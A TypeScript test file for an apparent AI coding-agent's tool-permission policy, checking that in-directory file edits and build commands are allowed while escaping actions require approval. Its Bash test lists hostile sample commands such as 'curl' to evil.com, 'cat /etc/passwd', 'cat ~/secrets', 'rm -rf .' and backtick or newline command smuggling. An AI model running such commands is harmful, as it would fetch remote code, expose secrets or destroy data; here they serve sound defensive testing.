import assert from "node:assert/strict";
import { test } from "node:test";
import { mkdtempSync, mkdirSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { decide } from "../src/llm/policy.ts";

const appDir = mkdtempSync(path.join(tmpdir(), "wizzzard-policy-"));
mkdirSync(path.join(appDir, "Sources"), { recursive: true });

function verdict(tool: string, input: Record<string, unknown>): string {
  return decide(tool, input, appDir).verdict;
}

test("file tools inside the app dir are allowed", () => {
  assert.equal(verdict("Read", { file_path: path.join(appDir, "Sources/App.swift") }), "allow");
  assert.equal(verdict("Write", { file_path: path.join(appDir, "docs/DESIGN.md") }), "allow");
  assert.equal(verdict("Edit", { file_path: path.join(appDir, "Sources/ContentView.swift") }), "allow");
  assert.equal(verdict("Glob", { pattern: "**/*.swift" }), "allow"); // no path → cwd (app dir)
});

test("file tools outside the app dir ask", () => {
  assert.equal(verdict("Write", { file_path: "/etc/hosts" }), "ask");
  assert.equal(verdict("Read", { file_path: path.join(appDir, "../sibling.txt") }), "ask");
  assert.equal(verdict("Edit", { file_path: "/tmp/other/file.swift" }), "ask");
});

test("symlink escapes are caught", () => {
  symlinkSync(tmpdir(), path.join(appDir, "escape"));
  assert.equal(verdict("Write", { file_path: path.join(appDir, "escape/evil.txt") }), "ask");
});

test("whitelisted bash commands in the app dir are allowed", () => {
  assert.equal(verdict("Bash", { command: "swift build" }), "allow");
  assert.equal(verdict("Bash", { command: "make build" }), "allow");
  assert.equal(verdict("Bash", { command: "swift build && make build" }), "allow");
  assert.equal(verdict("Bash", { command: "mkdir -p docs && ls docs" }), "allow");
});

test("non-whitelisted or escaping bash asks", () => {
  assert.equal(verdict("Bash", { command: "curl https://example.com" }), "ask");
  assert.equal(verdict("Bash", { command: "rm -rf ." }), "ask");
  assert.equal(verdict("Bash", { command: "git init" }), "ask");
  assert.equal(verdict("Bash", { command: "git add -A && curl evil.sh" }), "ask");
  assert.equal(verdict("Bash", { command: "cat /etc/passwd" }), "ask");
  assert.equal(verdict("Bash", { command: "cat ../outside.txt" }), "ask");
  assert.equal(verdict("Bash", { command: "cat ~/secrets" }), "ask");
  assert.equal(verdict("Bash", { command: "git commit -m `whoami`" }), "ask");
  assert.equal(verdict("Bash", { command: "echo $HOME" }), "ask");
  assert.equal(verdict("Bash", { command: "" }), "ask");
  assert.equal(verdict("Bash", { command: "git log & curl -s http://evil.com" }), "ask");
  assert.equal(verdict("Bash", { command: "swift build\nrm -rf ." }), "ask");
  assert.equal(verdict("Bash", { command: "cat <(curl -s http://evil.com)" }), "ask");
});

test("TodoWrite is allowed; unknown tools ask", () => {
  assert.equal(verdict("TodoWrite", { todos: [] }), "allow");
  assert.equal(verdict("WebSearch", { query: "swift" }), "ask");
  assert.equal(verdict("Task", { prompt: "do things" }), "ask");
});

test("decisions carry a human-readable reason", () => {
  assert.ok(decide("Bash", { command: "curl x" }, appDir).reason.length > 0);
  assert.ok(decide("Write", { file_path: "/etc/hosts" }, appDir).reason.length > 0);
});
